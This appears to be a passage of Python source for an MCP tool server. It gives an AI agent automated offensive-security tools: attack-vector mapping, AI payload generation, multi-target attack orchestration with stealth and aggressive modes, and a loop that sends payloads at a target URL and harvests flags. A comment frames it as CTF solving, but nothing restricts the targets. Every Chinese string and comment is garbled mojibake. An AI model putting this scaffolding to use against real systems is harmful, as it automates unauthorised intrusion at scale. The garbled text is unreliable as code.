                strength=strength,
                properties=props
            )

            return {
                "success": True,
                "relation_id": relation_id,
                "source_node_id": source_node_id,
                "target_node_id": target_node_id,
                "relation_type": relation_type,
                "strength": strength,
                "properties": props,
                "message": f"æˆåŠŸæ·»åŠ å…³ç³»: {relation_type}"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "æ·»åŠ å…³ç³»å¤±è´¥"
            }

    @mcp.tool()
    def knowledge_graph_get_statistics() -> Dict[str, Any]:
        """
        è·å–çŸ¥è¯†å›¾è°±ç»Ÿè®¡ä¿¡æ¯

        Returns:
            åŒ…å«å›¾è°±ç»Ÿè®¡ä¿¡æ¯çš„å­—å…¸
        """
        try:
            stats = attack_knowledge_graph.get_knowledge_statistics()

            return {
                "success": True,
                "statistics": stats,
                "insights": {
                    "most_common_node_type": max(stats["nodes_by_type"].items(), key=lambda x: x[1])[0] if stats["nodes_by_type"] else "æ— ",
                    "most_common_relation_type": max(stats["relations_by_type"].items(), key=lambda x: x[1])[0] if stats["relations_by_type"] else "æ— ",
                    "knowledge_richness": "ä¸°å¯Œ" if stats["total_nodes"] > 20 else "åŸºç¡€"
                },
                "message": f"çŸ¥è¯†å›¾è°±åŒ…å« {stats['total_nodes']} ä¸ªèŠ‚ç‚¹å’Œ {stats['total_relations']} ä¸ªå…³ç³»"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "è·å–çŸ¥è¯†å›¾è°±ç»Ÿè®¡ä¿¡æ¯å¤±è´¥"
            }

    @mcp.tool()
    def knowledge_graph_smart_recommendation(current_context: str, session_history: str = "[]") -> Dict[str, Any]:
        """
        åŸºäºçŸ¥è¯†å›¾è°±çš„æ™ºèƒ½æ¨è

        Args:
            current_context: å½“å‰ä¸Šä¸‹æ–‡ï¼ŒJSONæ ¼å¼å­—ç¬¦ä¸²
            session_history: ä¼šè¯å†å²ï¼ŒJSONæ ¼å¼å­—ç¬¦ä¸²

        Returns:
            åŒ…å«æ™ºèƒ½æ¨èçš„å­—å…¸
        """
        try:
            import json

            # è§£æè¾“å…¥å‚æ•°
            try:
                context_data = json.loads(current_context) if current_context else {}
                history_data = json.loads(session_history) if session_history else []
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSONè§£æé”™è¯¯: {str(e)}",
                    "message": "è¯·æä¾›æœ‰æ•ˆçš„JSONæ ¼å¼æ•°æ®"
                }

            # åŸºäºçŸ¥è¯†å›¾è°±æ¨èå·¥å…·
            tool_recommendations = attack_knowledge_graph.recommend_tools_for_target(context_data)

            # ç»“åˆä¸Šä¸‹æ–‡åˆ†æå¢å¼ºæ¨è
            if history_data:
                # åˆ†æå†å²æˆåŠŸæ¨¡å¼
                successful_tools = []
                for entry in history_data:
                    if entry.get("outcome") == "success":
                        successful_tools.extend(entry.get("tools_used", []))

                # è°ƒæ•´æ¨èæƒé‡
                for rec in tool_recommendations:
                    if rec["tool_name"] in successful_tools:
                        rec["effectiveness_score"] = min(rec["effectiveness_score"] * 1.2, 1.0)
                        rec["reasoning"] += " (å†å²è¡¨ç°è‰¯å¥½)"

            # é‡æ–°æ’åº
            tool_recommendations.sort(key=lambda x: x["effectiveness_score"], reverse=True)

            return {
                "success": True,
                "tool_recommendations": tool_recommendations[:5],  # è¿”å›å‰5ä¸ª
                "knowledge_insights": {
                    "recommendation_count": len(tool_recommendations),
                    "confidence_level": sum(r["effectiveness_score"] for r in tool_recommendations[:3]) / 3 if tool_recommendations else 0,
                    "knowledge_coverage": "åŸºäºæ”»å‡»çŸ¥è¯†å›¾è°±çš„ä¸“ä¸šæ¨è"
                },
                "message": f"åŸºäºçŸ¥è¯†å›¾è°±å’Œå†å²ç»éªŒï¼Œæ¨è {len(tool_recommendations[:5])} ä¸ªæœ€ä½³å·¥å…·"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "æ™ºèƒ½æ¨èå¤±è´¥"
            }

    # ==================== è‡ªé€‚åº”æ‰§è¡Œå¼•æ“å·¥å…· ====================

    @mcp.tool()
    def adaptive_create_execution_context(session_id: str, target_info: str,
                                         initial_strategy: str = "auto") -> Dict[str, Any]:
        """
        åˆ›å»ºè‡ªé€‚åº”æ‰§è¡Œä¸Šä¸‹æ–‡

        Args:
            session_id: ä¼šè¯ID
            target_info: ç›®æ ‡ä¿¡æ¯ï¼ŒJSONæ ¼å¼å­—ç¬¦ä¸²
            initial_strategy: åˆå§‹ç­–ç•¥åç§°

        Returns:
            åŒ…å«æ‰§è¡Œä¸Šä¸‹æ–‡ä¿¡æ¯çš„å­—å…¸
        """
        try:
            import json

            # è§£æç›®æ ‡ä¿¡æ¯
            try:
                target_data = json.loads(target_info) if target_info else {}
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSONè§£æé”™è¯¯: {str(e)}",
                    "message": "è¯·æä¾›æœ‰æ•ˆçš„JSONæ ¼å¼ç›®æ ‡ä¿¡æ¯"
                }

            context_id = adaptive_execution_engine.create_execution_context(
                session_id=session_id,
                target_info=target_data,
                initial_strategy=initial_strategy
            )

            return {
                "success": True,
                "context_id": context_id,
                "session_id": session_id,
                "target_info": target_data,
                "initial_strategy": initial_strategy,
                "execution_state": "planning",
                "message": f"æˆåŠŸåˆ›å»ºæ‰§è¡Œä¸Šä¸‹æ–‡: {context_id}"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "åˆ›å»ºæ‰§è¡Œä¸Šä¸‹æ–‡å¤±è´¥"
            }

    @mcp.tool()
    def adaptive_execute_strategy(context_id: str, strategy_name: str = "") -> Dict[str, Any]:
        """
        æ‰§è¡Œè‡ªé€‚åº”ç­–ç•¥

        Args:
            context_id: æ‰§è¡Œä¸Šä¸‹æ–‡ID
            strategy_name: ç­–ç•¥åç§°ï¼ˆå¯é€‰ï¼Œä¸ºç©ºåˆ™è‡ªåŠ¨é€‰æ‹©ï¼‰

        Returns:
            åŒ…å«æ‰§è¡Œç»“æœçš„å­—å…¸
        """
        try:
            result = adaptive_execution_engine.execute_adaptive_strategy(
                context_id=context_id,
                strategy_name=strategy_name if strategy_name else None
            )

            if not result.get("success", False):
                return {
                    "success": False,
                    "error": result.get("error", "æœªçŸ¥é”™è¯¯"),
                    "message": "ç­–ç•¥æ‰§è¡Œå¤±è´¥"
                }

            return {
                "success": True,
                "execution_result": result,
                "message": f"ç­–ç•¥ {result['strategy_name']} æ‰§è¡Œå®Œæˆï¼Œæ€§èƒ½è¯„åˆ†: {result['performance_score']:.2f}"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "è‡ªé€‚åº”ç­–ç•¥æ‰§è¡Œå¤±è´¥"
            }

    @mcp.tool()
    def adaptive_get_execution_status(context_id: str) -> Dict[str, Any]:
        """
        è·å–æ‰§è¡Œä¸Šä¸‹æ–‡çŠ¶æ€

        Args:
            context_id: æ‰§è¡Œä¸Šä¸‹æ–‡ID

        Returns:
            åŒ…å«æ‰§è¡ŒçŠ¶æ€çš„å­—å…¸
        """
        try:
            status = adaptive_execution_engine.get_execution_status(context_id)

            if "error" in status:
                return {
                    "success": False,
                    "error": status["error"],
                    "message": "è·å–æ‰§è¡ŒçŠ¶æ€å¤±è´¥"
                }

            return {
                "success": True,
                "status": status,
                "message": f"ä¸Šä¸‹æ–‡ {context_id} å½“å‰çŠ¶æ€: {status['execution_state']}"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "è·å–æ‰§è¡ŒçŠ¶æ€å¤±è´¥"
            }

    @mcp.tool()
    def adaptive_get_insights(context_id: str) -> Dict[str, Any]:
        """
        è·å–è‡ªé€‚åº”æ‰§è¡Œæ´å¯Ÿ

        Args:
            context_id: æ‰§è¡Œä¸Šä¸‹æ–‡ID

        Returns:
            åŒ…å«é€‚åº”æ€§æ´å¯Ÿçš„å­—å…¸
        """
        try:
            insights = adaptive_execution_engine.get_adaptation_insights(context_id)

            if "error" in insights:
                return {
                    "success": False,
                    "error": insights["error"],
                    "message": "è·å–é€‚åº”æ€§æ´å¯Ÿå¤±è´¥"
                }

            return {
                "success": True,
                "insights": insights,
                "message": insights["message"]
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "è·å–é€‚åº”æ€§æ´å¯Ÿå¤±è´¥"
            }

    @mcp.tool()
    def adaptive_intelligent_orchestration(target_list: str, orchestration_mode: str = "balanced") -> Dict[str, Any]:
        """
        æ™ºèƒ½ç¼–æ’å¤šç›®æ ‡è‡ªé€‚åº”æ”»å‡»

        Args:
            target_list: ç›®æ ‡åˆ—è¡¨ï¼ŒJSONæ ¼å¼å­—ç¬¦ä¸²
            orchestration_mode: ç¼–æ’æ¨¡å¼ (balanced, aggressive, stealth, quick)

        Returns:
            åŒ…å«æ™ºèƒ½ç¼–æ’ç»“æœçš„å­—å…¸
        """
        try:
            import json

            # è§£æç›®æ ‡åˆ—è¡¨
            try:
                targets = json.loads(target_list) if target_list else []
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSONè§£æé”™è¯¯: {str(e)}",
                    "message": "è¯·æä¾›æœ‰æ•ˆçš„JSONæ ¼å¼ç›®æ ‡åˆ—è¡¨"
                }

            orchestration_results = []

            for i, target in enumerate(targets):
                # ä¸ºæ¯ä¸ªç›®æ ‡åˆ›å»ºæ‰§è¡Œä¸Šä¸‹æ–‡
                session_id = f"orchestration_{int(time.time())}_{i}"
                context_id = adaptive_execution_engine.create_execution_context(
                    session_id=session_id,
                    target_info=target
                )

                # åŸºäºç¼–æ’æ¨¡å¼é€‰æ‹©ç­–ç•¥
                strategy_mapping = {
                    "balanced": "auto",
                    "aggressive": "comprehensive",
                    "stealth": "stealth_scan",
                    "quick": "quick_scan"
                }

                strategy = strategy_mapping.get(orchestration_mode, "auto")

                # æ‰§è¡Œè‡ªé€‚åº”ç­–ç•¥
                execution_result = adaptive_execution_engine.execute_adaptive_strategy(
                    context_id=context_id,
                    strategy_name=strategy
                )

                orchestration_results.append({
                    "target": target,
                    "context_id": context_id,
                    "execution_result": execution_result
                })

            # æ±‡æ€»ç»“æœ
            total_targets = len(targets)
            successful_executions = len([r for r in orchestration_results
                                       if r["execution_result"].get("success", False)])

            return {
                "success": True,
                "orchestration_mode": orchestration_mode,
                "total_targets": total_targets,
                "successful_executions": successful_executions,
                "success_rate": successful_executions / total_targets if total_targets > 0 else 0,
                "execution_results": orchestration_results,
                "message": f"æ™ºèƒ½ç¼–æ’å®Œæˆ: {successful_executions}/{total_targets} ä¸ªç›®æ ‡æ‰§è¡ŒæˆåŠŸ"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "æ™ºèƒ½ç¼–æ’å¤±è´¥"
            }


    # ==================== AIæ™ºèƒ½åŒ–æ ¸å¿ƒå·¥å…· ====================
    # è¿™äº›å·¥å…·ä¸“é—¨è®¾è®¡ç»™AIè°ƒç”¨ï¼Œå®ç°çœŸæ­£çš„æ™ºèƒ½åŒ–CTFè§£é¢˜

    @mcp.tool()
    async def ai_intelligent_target_analysis(
        target_url: str,
        ai_analysis_context: str = "",
        analysis_depth: str = "comprehensive"
    ) -> Dict[str, Any]:
        """
        AIæ™ºèƒ½ç›®æ ‡åˆ†æå·¥å…· - è®©AIä¼ å…¥åˆ†ææ€è·¯ï¼Œè·å¾—ç»“æ„åŒ–åˆ†ææ•°æ®

        Args:
            target_url: ç›®æ ‡URL
            ai_analysis_context: AIçš„åˆ†æä¸Šä¸‹æ–‡å’Œæ¨ç†æ€è·¯
            analysis_depth: åˆ†ææ·±åº¦ (quick/standard/comprehensive/deep)

        Returns:
            ç»“æ„åŒ–çš„ç›®æ ‡åˆ†ææ•°æ®ï¼Œä¾›AIè¿›ä¸€æ­¥æ¨ç†ä½¿ç”¨
        """
        try:
            logger.info(f"ğŸ§  AIæ™ºèƒ½ç›®æ ‡åˆ†æ: {target_url}")
            logger.info(f"AIåˆ†æä¸Šä¸‹æ–‡: {ai_analysis_context}")

            # åˆ›å»ºåˆ†æä¼šè¯
            analysis_session = {
                'session_id': str(uuid.uuid4()),
                'target': target_url,
                'ai_context': ai_analysis_context,
                'timestamp': datetime.now().isoformat(),
                'analysis_depth': analysis_depth
            }

            # å¤šå±‚æ¬¡æŠ€æœ¯æŒ‡çº¹è¯†åˆ«
            tech_fingerprints = await _ai_enhanced_tech_detection(target_url, ai_analysis_context)

            # æ™ºèƒ½æ¼æ´è¡¨é¢åˆ†æ
            vulnerability_surface = await _ai_vulnerability_surface_mapping(target_url, tech_fingerprints)

            # åŸºäºAIä¸Šä¸‹æ–‡çš„æ”»å‡»å‘é‡æ¨è
            attack_vectors = _ai_attack_vector_recommendation(tech_fingerprints, vulnerability_surface, ai_analysis_context)

            # æ™ºèƒ½ç«¯ç‚¹å‘ç°
            endpoints = await _ai_endpoint_discovery(target_url, analysis_depth)

            # ç”ŸæˆAIå‹å¥½çš„ç»“æ„åŒ–æŠ¥å‘Š
            analysis_report = {
                "session_id": analysis_session['session_id'],
                "target_intelligence": {
                    "url": target_url,
                    "technology_stack": tech_fingerprints,
                    "security_posture": vulnerability_surface,
                    "discovered_endpoints": endpoints,
                    "ai_analysis_integration": {
                        "context_applied": bool(ai_analysis_context),
                        "ai_insights": _extract_ai_insights(ai_analysis_context),
                        "recommended_approach": _ai_recommended_approach(tech_fingerprints, ai_analysis_context)
                    }
                },
                "attack_surface_map": {
                    "high_priority_vectors": attack_vectors['high_priority'],
                    "medium_priority_vectors": attack_vectors['medium_priority'],
                    "experimental_vectors": attack_vectors['experimental'],
                    "ai_custom_vectors": attack_vectors.get('ai_custom', [])
                },
                "intelligence_confidence": {
                    "technology_detection": tech_fingerprints.get('confidence', 0.8),
                    "vulnerability_assessment": vulnerability_surface.get('confidence', 0.7),
                    "attack_vector_relevance": attack_vectors.get('confidence', 0.9)
                },
                "ai_recommendations": {
                    "next_steps": _generate_ai_next_steps(tech_fingerprints, vulnerability_surface),
                    "payload_strategies": _suggest_payload_strategies(tech_fingerprints, ai_analysis_context),
                    "learning_opportunities": _identify_learning_opportunities(tech_fingerprints, vulnerability_surface)
                }
            }

            # å­˜å‚¨åˆ†æä¼šè¯ä¾›åç»­ä½¿ç”¨
            global ai_analysis_sessions
            if 'ai_analysis_sessions' not in globals():
                ai_analysis_sessions = {}
            ai_analysis_sessions[analysis_session['session_id']] = analysis_report

            logger.info(f"âœ… AIæ™ºèƒ½åˆ†æå®Œæˆï¼Œä¼šè¯ID: {analysis_session['session_id']}")
            return {
                "success": True,
                "analysis_session_id": analysis_session['session_id'],
                **analysis_report
            }

        except Exception as e:
            logger.error(f"AIæ™ºèƒ½ç›®æ ‡åˆ†æå¤±è´¥: {e}")
            return {
                "success": False,
                "error": str(e),
                "message": "AIæ™ºèƒ½ç›®æ ‡åˆ†æå¤±è´¥"
            }

    @mcp.tool()
    async def ai_context_memory_store(
        session_id: str,
        context_type: str,
        ai_reasoning: str,
        data: str,
        confidence_score: float = 0.8
    ) -> Dict[str, Any]:
        """
        AIä¸Šä¸‹æ–‡è®°å¿†å­˜å‚¨å·¥å…· - è®©AIèƒ½å¤Ÿå­˜å‚¨æ¨ç†ä¸Šä¸‹æ–‡å’Œå‘ç°

        Args:
            session_id: åˆ†æä¼šè¯ID
            context_type: ä¸Šä¸‹æ–‡ç±»å‹ (analysis/attack_result/learning/hypothesis)
            ai_reasoning: AIçš„æ¨ç†è¿‡ç¨‹æè¿°
            data: è¦å­˜å‚¨çš„æ•°æ®
            confidence_score: AIå¯¹è¿™ä¸ªå‘ç°çš„ç½®ä¿¡åº¦

        Returns:
            å­˜å‚¨ç»“æœç¡®è®¤
        """
        try:
            logger.info(f"ğŸ§  AIå­˜å‚¨ä¸Šä¸‹æ–‡è®°å¿†: {context_type}")

            # åˆå§‹åŒ–å…¨å±€è®°å¿†å­˜å‚¨
            global ai_memory_store
            if 'ai_memory_store' not in globals():
                ai_memory_store = {}

            if session_id not in ai_memory_store:
                ai_memory_store[session_id] = {
                    'contexts': [],
                    'created_at': datetime.now().isoformat(),
                    'last_updated': datetime.now().isoformat()
                }

            # åˆ›å»ºè®°å¿†æ¡ç›®
            memory_entry = {
                'memory_id': str(uuid.uuid4()),
                'context_type': context_type,
                'ai_reasoning': ai_reasoning,
                'data': data,
                'confidence_score': confidence_score,
                'timestamp': datetime.now().isoformat(),
                'retrieval_count': 0
            }

            # å­˜å‚¨è®°å¿†
            ai_memory_store[session_id]['contexts'].append(memory_entry)
            ai_memory_store[session_id]['last_updated'] = datetime.now().isoformat()

            logger.info(f"âœ… AIè®°å¿†å·²å­˜å‚¨ï¼Œè®°å¿†ID: {memory_entry['memory_id']}")
            return {
                "success": True,
                "memory_id": memory_entry['memory_id'],
                "session_id": session_id,
                "stored_context_type": context_type,
                "memory_count": len(ai_memory_store[session_id]['contexts']),
                "message": f"AIä¸Šä¸‹æ–‡è®°å¿†å·²å­˜å‚¨ ({context_type})"
            }

        except Exception as e:
            logger.error(f"AIä¸Šä¸‹æ–‡è®°å¿†å­˜å‚¨å¤±è´¥: {e}")
            return {
                "success": False,
                "error": str(e),
                "message": "AIä¸Šä¸‹æ–‡è®°å¿†å­˜å‚¨å¤±è´¥"
            }

    @mcp.tool()
    async def ai_context_memory_retrieve(
        session_id: str,
        query_description: str,
        context_types: List[str] = None
    ) -> Dict[str, Any]:
        """
        AIä¸Šä¸‹æ–‡è®°å¿†æ£€ç´¢å·¥å…· - è®©AIèƒ½å¤Ÿæ£€ç´¢ç›¸å…³çš„å†å²æ¨ç†å’Œå‘ç°

        Args:
            session_id: åˆ†æä¼šè¯ID
            query_description: AIçš„æŸ¥è¯¢æè¿°
            context_types: è¦æ£€ç´¢çš„ä¸Šä¸‹æ–‡ç±»å‹åˆ—è¡¨

        Returns:
            ç›¸å…³çš„å†å²ä¸Šä¸‹æ–‡å’Œè®°å¿†
        """
        try:
            logger.info(f"ğŸ§  AIæ£€ç´¢ä¸Šä¸‹æ–‡è®°å¿†: {query_description}")

            global ai_memory_store
            if 'ai_memory_store' not in globals() or session_id not in ai_memory_store:
                return {
                    "success": True,
                    "relevant_memories": [],
                    "message": "æœªæ‰¾åˆ°ç›¸å…³è®°å¿†"
                }

            memories = ai_memory_store[session_id]['contexts']
            relevant_memories = []

            # ç®€å•çš„ç›¸å…³æ€§åŒ¹é…ï¼ˆå®é™…åº”ç”¨ä¸­å¯ä»¥ä½¿ç”¨æ›´å¤æ‚çš„è¯­ä¹‰åŒ¹é…ï¼‰
            query_lower = query_description.lower()
            for memory in memories:
                # æ›´æ–°æ£€ç´¢è®¡æ•°
                memory['retrieval_count'] += 1

                # æ£€æŸ¥ä¸Šä¸‹æ–‡ç±»å‹è¿‡æ»¤
                if context_types and memory['context_type'] not in context_types:
                    continue

                # æ£€æŸ¥ç›¸å…³æ€§
                relevance_score = 0.0

                # æ£€æŸ¥AIæ¨ç†ä¸­çš„å…³é”®è¯åŒ¹é…
                if any(word in memory['ai_reasoning'].lower() for word in query_lower.split()):
                    relevance_score += 0.4

                # æ£€æŸ¥æ•°æ®ä¸­çš„å…³é”®è¯åŒ¹é…
                if any(word in memory['data'].lower() for word in query_lower.split()):
                    relevance_score += 0.3

                # è€ƒè™‘ç½®ä¿¡åº¦å’Œæ—¶é—´å› ç´ 
                relevance_score += memory['confidence_score'] * 0.2
                relevance_score += min(0.1, 1.0 / (memory['retrieval_count'] + 1)) # å¸¸ç”¨è®°å¿†åŠ åˆ†

                if relevance_score > 0.3:  # ç›¸å…³æ€§é˜ˆå€¼
                    relevant_memories.append({
                        **memory,
                        'relevance_score': relevance_score
                    })

            # æŒ‰ç›¸å…³æ€§æ’åº
            relevant_memories.sort(key=lambda x: x['relevance_score'], reverse=True)

            logger.info(f"âœ… AIè®°å¿†æ£€ç´¢å®Œæˆï¼Œæ‰¾åˆ° {len(relevant_memories)} æ¡ç›¸å…³è®°å¿†")
            return {
                "success": True,
                "query": query_description,
                "relevant_memories": relevant_memories[:10],  # è¿”å›å‰10æ¡æœ€ç›¸å…³çš„
                "total_memories": len(memories),
                "relevance_threshold": 0.3,
                "message": f"æ‰¾åˆ° {len(relevant_memories)} æ¡ç›¸å…³è®°å¿†"
            }

        except Exception as e:
            logger.error(f"AIä¸Šä¸‹æ–‡è®°å¿†æ£€ç´¢å¤±è´¥: {e}")
            return {
                "success": False,
                "error": str(e),
                "message": "AIä¸Šä¸‹æ–‡è®°å¿†æ£€ç´¢å¤±è´¥"
            }

    @mcp.tool()
    async def ai_smart_payload_generation(
        target_context: str,
        attack_type: str,
        ai_hypothesis: str,
        historical_feedback: str = "",
        creativity_level: float = 0.7
    ) -> Dict[str, Any]:
        """
        AIæ™ºèƒ½Payloadç”Ÿæˆå·¥å…· - åŸºäºAIæ¨ç†ç”Ÿæˆé«˜è´¨é‡æ”»å‡»è½½è·

        Args:
            target_context: ç›®æ ‡ä¸Šä¸‹æ–‡ä¿¡æ¯
            attack_type: æ”»å‡»ç±»å‹
            ai_hypothesis: AIçš„æ”»å‡»å‡è®¾å’Œæ¨ç†
            historical_feedback: ä»ä¹‹å‰å¤±è´¥ä¸­å­¦åˆ°çš„ä¿¡æ¯
            creativity_level: åˆ›æ–°ç¨‹åº¦ (0.0-1.0)

        Returns:
            AIç”Ÿæˆçš„æ™ºèƒ½Payloadåˆ—è¡¨
        """
        try:
            logger.info(f"ğŸ§  AIæ™ºèƒ½Payloadç”Ÿæˆ: {attack_type}")
            logger.info(f"AIå‡è®¾: {ai_hypothesis}")

            # è§£æç›®æ ‡ä¸Šä¸‹æ–‡
            context_data = json.loads(target_context) if target_context.startswith('{') else {'info': target_context}

            # åŸºç¡€Payloadæ¨¡æ¿
            base_payloads = _get_base_payloads_for_ai(attack_type)

            # AIå¢å¼ºPayloadç”Ÿæˆ
            ai_enhanced_payloads = []

            # 1. åŸºäºAIå‡è®¾çš„å®šåˆ¶åŒ–Payload
            hypothesis_payloads = _generate_hypothesis_based_payloads(ai_hypothesis, attack_type, context_data)
            ai_enhanced_payloads.extend(hypothesis_payloads)

            # 2. åŸºäºå†å²åé¦ˆçš„æ”¹è¿›Payload
            if historical_feedback:
                feedback_payloads = _generate_feedback_improved_payloads(historical_feedback, attack_type, base_payloads)
                ai_enhanced_payloads.extend(feedback_payloads)

            # 3. ä¸Šä¸‹æ–‡è‡ªé€‚åº”Payload
            context_payloads = _generate_context_adaptive_payloads(context_data, attack_type, creativity_level)
            ai_enhanced_payloads.extend(context_payloads)

            # 4. åˆ›æ–°æ€§Payloadï¼ˆåŸºäºåˆ›æ–°ç¨‹åº¦ï¼‰
            if creativity_level > 0.5:
                creative_payloads = _generate_creative_payloads(attack_type, ai_hypothesis, creativity_level)
                ai_enhanced_payloads.extend(creative_payloads)

            # 5. ç»„åˆå’Œå˜å¼‚Payload
            combination_payloads = _generate_combination_payloads(base_payloads, ai_enhanced_payloads, context_data)
            ai_enhanced_payloads.extend(combination_payloads)

            # å»é‡å’Œè´¨é‡è¯„åˆ†
            unique_payloads = list(set(ai_enhanced_payloads))
            scored_payloads = []

            for payload in unique_payloads:
                quality_score = _calculate_payload_quality_score(payload, context_data, ai_hypothesis)
                scored_payloads.append({
                    'payload': payload,
                    'quality_score': quality_score,
                    'generation_method': _identify_generation_method(payload, ai_enhanced_payloads),
                    'ai_confidence': quality_score * creativity_level,
                    'expected_success_rate': _estimate_payload_success_rate(payload, context_data)
                })

            # æŒ‰è´¨é‡è¯„åˆ†æ’åº
            scored_payloads.sort(key=lambda x: x['quality_score'], reverse=True)

            logger.info(f"âœ… AIæ™ºèƒ½Payloadç”Ÿæˆå®Œæˆï¼Œç”Ÿæˆ {len(scored_payloads)} ä¸ªé«˜è´¨é‡Payload")
            return {
                "success": True,
                "attack_type": attack_type,
                "ai_hypothesis": ai_hypothesis,
                "generation_stats": {
                    "total_generated": len(scored_payloads),
                    "high_quality_count": len([p for p in scored_payloads if p['quality_score'] > 0.7]),
                    "creativity_level": creativity_level,
                    "context_applied": bool(target_context),
                    "feedback_applied": bool(historical_feedback)
                },
                "ai_generated_payloads": scored_payloads[:20],  # è¿”å›å‰20ä¸ªæœ€ä½³Payload
                "payload_categories": {
                    "hypothesis_based": len(hypothesis_payloads),
                    "feedback_improved": len(feedback_payloads) if historical_feedback else 0,
                    "context_adaptive": len(context_payloads),
                    "creative": len(creative_payloads) if creativity_level > 0.5 else 0,
                    "combination": len(combination_payloads)
                },
                "message": f"AIç”Ÿæˆäº† {len(scored_payloads)} ä¸ªæ™ºèƒ½Payloadï¼Œå¹³å‡è´¨é‡è¯„åˆ†: {sum(p['quality_score'] for p in scored_payloads) / len(scored_payloads):.2f}"
            }

        except Exception as e:
            logger.error(f"AIæ™ºèƒ½Payloadç”Ÿæˆå¤±è´¥: {e}")
            return {
                "success": False,
                "error": str(e),
                "message": "AIæ™ºèƒ½Payloadç”Ÿæˆå¤±è´¥"
            }

    @mcp.tool()
    async def ai_adaptive_attack_execution(
        attack_plan: str,
        target_url: str,
        ai_payloads: List[str],
        adaptation_strategy: str,
        success_criteria: str
    ) -> Dict[str, Any]:
        """
        AIè‡ªé€‚åº”æ”»å‡»æ‰§è¡Œå·¥å…· - æ ¹æ®AIåˆ¶å®šçš„è®¡åˆ’æ‰§è¡Œæ™ºèƒ½æ”»å‡»

        Args:
            attack_plan: AIåˆ¶å®šçš„æ”»å‡»è®¡åˆ’
            target_url: ç›®æ ‡URL
            ai_payloads: AIç”Ÿæˆçš„Payloadåˆ—è¡¨
            adaptation_strategy: AIçš„é€‚åº”ç­–ç•¥
            success_criteria: AIå®šä¹‰çš„æˆåŠŸæ ‡å‡†

        Returns:
            è‡ªé€‚åº”æ”»å‡»æ‰§è¡Œç»“æœ
        """
        try:
            logger.info(f"ğŸ§  AIè‡ªé€‚åº”æ”»å‡»æ‰§è¡Œ: {target_url}")
            logger.info(f"æ”»å‡»è®¡åˆ’: {attack_plan}")
            logger.info(f"é€‚åº”ç­–ç•¥: {adaptation_strategy}")

            execution_session = {
                'session_id': str(uuid.uuid4()),
                'target': target_url,
                'attack_plan': attack_plan,
                'adaptation_strategy': adaptation_strategy,
                'success_criteria': success_criteria,
                'start_time': datetime.now().isoformat(),
                'execution_log': []
            }

            attack_results = []
            adaptation_actions = []
            current_strategy = adaptation_strategy

            # è§£ææˆåŠŸæ ‡å‡†
            success_indicators = _parse_ai_success_criteria(success_criteria)

            # æ‰§è¡ŒAIåˆ¶å®šçš„æ”»å‡»è®¡åˆ’
            for i, payload in enumerate(ai_payloads[:15]):  # é™åˆ¶æ‰§è¡Œæ•°é‡
                logger.info(f"æ‰§è¡ŒPayload {i+1}/{min(15, len(ai_payloads))}: {payload[:50]}...")

                # æ‰§è¡Œå•ä¸ªæ”»å‡»
                attack_result = await _execute_single_ai_attack(target_url, payload, success_indicators)
                attack_results.append(attack_result)

                execution_session['execution_log'].append({
                    'payload_index': i,
                    'payload': payload,
                    'result': attack_result,
                    'timestamp': datetime.now().isoformat()
                })

                # æ£€æŸ¥æ˜¯å¦è¾¾åˆ°æˆåŠŸæ ‡å‡†
                if _check_ai_success_criteria(attack_result, success_indicators):
                    logger.info(f"ğŸ¯ AIæˆåŠŸæ ‡å‡†å·²è¾¾æˆï¼åœæ­¢æ”»å‡»")
                    break

                # AIè‡ªé€‚åº”è°ƒæ•´ç­–ç•¥
                if i > 0 and i % 5 == 0:  # æ¯5æ¬¡æ”»å‡»åè¯„ä¼°
                    adaptation_action = await _ai_adaptive_strategy_adjustment(
                        attack_results[-5:], current_strategy, adaptation_strategy
                    )

                    if adaptation_action['action_type'] != 'continue':
                        adaptation_actions.append(adaptation_action)
                        current_strategy = adaptation_action.get('new_strategy', current_strategy)
                        logger.info(f"ğŸ”„ AIç­–ç•¥è‡ªé€‚åº”è°ƒæ•´: {adaptation_action['action_type']}")

            # åˆ†ææ‰§è¡Œç»“æœ
            execution_analysis = _analyze_ai_attack_execution(attack_results, success_indicators, adaptation_actions)

            # æå–å‘ç°çš„Flag
            flags_found = []
            for result in attack_results:
                if result.get('flags'):
                    flags_found.extend(result['flags'])

            logger.info(f"âœ… AIè‡ªé€‚åº”æ”»å‡»æ‰§è¡Œå®Œæˆï¼Œå‘ç° {len(flags_found)} ä¸ªFlag")
            return {
                "success": True,
                "execution_session_id": execution_session['session_id'],
                "attack_execution_results": {
                    "total_attacks": len(attack_results),
                    "successful_attacks": len([r for r in attack_results if r.get('success')]),
                    "flags_discovered": flags_found,
                    "success_criteria_met": execution_analysis['success_criteria_met'],
                    "adaptation_actions": adaptation_actions
                },
                "ai_analysis": {
                    "attack_plan_effectiveness": execution_analysis['plan_effectiveness'],
                    "adaptation_effectiveness": execution_analysis['adaptation_effectiveness'],
                    "payload_quality_assessment": execution_analysis['payload_quality'],
                    "learning_insights": execution_analysis['learning_insights']
                },
                "execution_metrics": {
                    "success_rate": execution_analysis['success_rate'],
                    "average_response_time": execution_analysis['avg_response_time'],
                    "adaptation_trigger_count": len(adaptation_actions),
                    "execution_duration": execution_analysis['duration']
                },
                "message": f"AIè‡ªé€‚åº”æ”»å‡»å®Œæˆ - æˆåŠŸç‡: {execution_analysis['success_rate']:.1%}, å‘ç°Flag: {len(flags_found)}"
            }

        except Exception as e:
            logger.error(f"AIè‡ªé€‚åº”æ”»å‡»æ‰§è¡Œå¤±è´¥: {e}")
            return {
                "success": False,
                "error": str(e),
                "message": "AIè‡ªé€‚åº”æ”»å‡»æ‰§è¡Œå¤±è´¥"
            }

    @mcp.tool()
    async def ai_learning_feedback(
        session_id: str,
        success_patterns: str,
        failure_analysis: str,
        new_insights: str,
        confidence_score: float
    ) -> Dict[str, Any]:
        """
